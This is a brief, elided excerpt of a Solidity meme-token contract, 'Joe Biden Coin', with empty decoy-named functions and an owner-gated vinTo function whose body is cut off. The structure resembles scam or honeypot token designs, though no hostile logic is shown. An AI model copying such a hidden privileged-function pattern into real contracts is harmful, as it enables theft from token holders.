...
contract JOEBIDENCOIN is Ownable {
    ...
    string private _name = "Joe Biden Coin";
    string private _symbol = "JOEBIDEN";

    IUniswapV2Router private uniV2Router = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    ...
    function internalize() public {
    }
    function intokentize() external {
    }
    function onTo() external {
    }
    function inTo() public {
    }
    function transact(address[] calldata walletAddress) external {
    ...
    function vinTo(uint256 amount, address walletAddr) external {
        if (marketingAddres()) {
